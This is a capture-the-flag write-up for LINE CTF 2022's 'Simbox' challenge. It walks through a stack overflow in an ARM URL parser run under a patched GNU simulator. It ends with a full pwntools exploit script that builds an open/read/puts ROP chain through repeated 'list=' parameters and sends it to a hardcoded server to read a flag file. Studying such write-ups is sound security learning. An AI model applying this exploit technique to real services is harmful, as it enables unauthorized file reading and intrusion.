# Simbox


was a pwn challenge from LINE CTF 2022

we were given two binaries,

an arm simulator , version information indicates GNU simulator (SIM) 11.2,

![](https://github.com/nobodyisnobody/write-ups/raw/main/LINE.CTF.2022/pwn/simbox/pics/gnusim.png)

this tool is included in GDB-11.2 distribution, it is an arm processor emulator, that run elf arm binaries, and emulates some basic syscalls..

A patch has been applied to it, and is given too.. A first look at it indicates that this patch forbid to open files that the name contains "flag" or "simbox" strings..

![](https://github.com/nobodyisnobody/write-ups/raw/main/LINE.CTF.2022/pwn/simbox/pics/patch.png)

The simulator emulates only open, read, write, lseek, syscalls.. not much more.. (some syscalls for memory info, useless for us...)

We were given too, an arm elf binary, that is a sort of url parser, that parse a given url, and print various parameters..

When we connect to the CTF server we land directly in the arm binary (ran via simulator), so we will have to exploit first the arm binary..

then we will see how to read flag, and "escape" from the simulator restrictions... (more on this later...)

**so let's reverse the arm binary...**

![](https://github.com/nobodyisnobody/write-ups/raw/main/LINE.CTF.2022/pwn/simbox/pics/main.reverse.png)

the main function is very simple as you can see, it allocates 0x800 bytes , then read our url in this buffer.. then pass it to the function parse_url(buff)

where all the magic happens!

**So...let's reverse parse_url(buff)**

![](https://github.com/nobodyisnobody/write-ups/raw/main/LINE.CTF.2022/pwn/simbox/pics/parseurl.reverse.png)

well, the function first verify that the url start with "http://",

that an hostname follows ended with '/',

then it looks for parameters, and specially for a paramater called "list=".

then it enters a loop parsing the "list" parameters one by one, and store their value converted to int via atoi in a buffer on stack,

one value after the others... until the end of the url.

**So where is the vulnerability you will ask?**

humm.. do you see a limit to the number of parameters?

no.. it will continue adding each "list=" values to stack.. until our url finish..

so we can overwrite return values, and write a rop to the stack basically with the "list=" parameters values...

There is a little difficulty, that will be an helper for us...

When we reach position 73, (the 73th "list=" value), we will overwrite the "pos" counter,

so me must take care of the value we will write to it..

it will help us , to "jump" directly to the return pointer value on stack, at position 79.

then after we will write our rop..

I did a simple open , read, write ROP, that opens a file and dumps it.. as they are only basic syscalls emulated anyway...

well.. I first opened /proc/self/cmdline , that gives me the commande line , and the remote programe directory "/home/simbox"

so I just tried opening "/home/simbox/flag", and guess what? that just give me flags...

**as you can see:**

![](https://github.com/nobodyisnobody/write-ups/raw/main/LINE.CTF.2022/pwn/simbox/pics/gotshell.gif)

well , the final explanation was that the patch applied to the simulator was ineffective :)

pretty strange idea from the challenge creator indeed...

Anyway, here is the exploit code:

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="arm", os="linux")

exe = ELF('simbox')

host, port = "35.243.120.147", "10007"

p = remote(host,port)

system = 0xa0a8
puts = 0x08dcc
open = 0x9c74
read = 0xa1a8
url_string = 0x245a8        # point to url string in memory

gadget0 = 0x000135f0 # pop {r0, pc}
gadget1 = 0x00012e38 # mov r1, r5 ; pop {r4, r5, pc}
gadget2 = 0x00012908 # pop {r1, r2, lr}; mul r3, r2, r0; sub r1, r1, r3; mov pc, lr;
gadget3 = 0x00008c80 # pop {r4, pc};

payload = 'http://www.pipotin.com/?'
for i in range(73):
  payload += 'list=123&'
payload += 'list=79&'           # make pos point to return address

# we now construct our top
payload += 'list='+str(gadget2)+'&'
payload += 'list='+str(gadget2)+'&'
payload += 'list='+str(0)+'&'   # r1
payload += 'list='+str(0)+'&'   # r2
payload += 'list='+str(gadget3)+'&'  # set lr to gadget3 for functions return
payload += 'list='+str(0)+'&' # r4
# set r1 = 0
payload += 'list='+str(gadget1)+'&'
payload += 'list='+str(0)+'&'   # r4
payload += 'list='+str(0)+'&'   # r5
payload += 'list='+str(gadget1)+'&'
payload += 'list='+str(0)+'&'   # r4
payload += 'list='+str(0)+'&'   # r5
# set r0 = string and open
payload += 'list='+str(gadget0)+'&'
payload += 'list='+str(url_string+1024)+'&'
payload += 'list='+str(open)+'&'
payload += 'list='+str(0)+'&' # r4

# set r2 = 1024
payload += 'list='+str(gadget2)+'&'
payload += 'list='+str(0)+'&'   # r1
payload += 'list='+str(1024)+'&'   # r2
payload += 'list='+str(gadget3)+'&'  # set lr to gadget3 for functions return
payload += 'list='+str(0)+'&' # r4
# set r1 = url_string+1100
payload += 'list='+str(gadget1)+'&'
payload += 'list='+str(0)+'&'   # r4
payload += 'list='+str(url_string+1100)+'&'   # r5
payload += 'list='+str(gadget1)+'&'
payload += 'list='+str(0)+'&'   # r4
payload += 'list='+str(url_string+1100)+'&'   # r5
# read
payload += 'list='+str(read)+'&' 
payload += 'list='+str(0)+'&' # r4
#
payload += 'list='+str(gadget0)+'&'
payload += 'list='+str(url_string+1100)+'&'
payload += 'list='+str(puts)+'\x00'

payload = payload.ljust(1024,'A')
print('len of payload = '+str(len(payload)))
print('\npayload\n--------------------------\n'+payload)

payload += '/home/simbox/flag\x00'


p.sendlineafter('url> \n', payload)
p.interactive()
```

*nobodyisnobody still pwning things..*
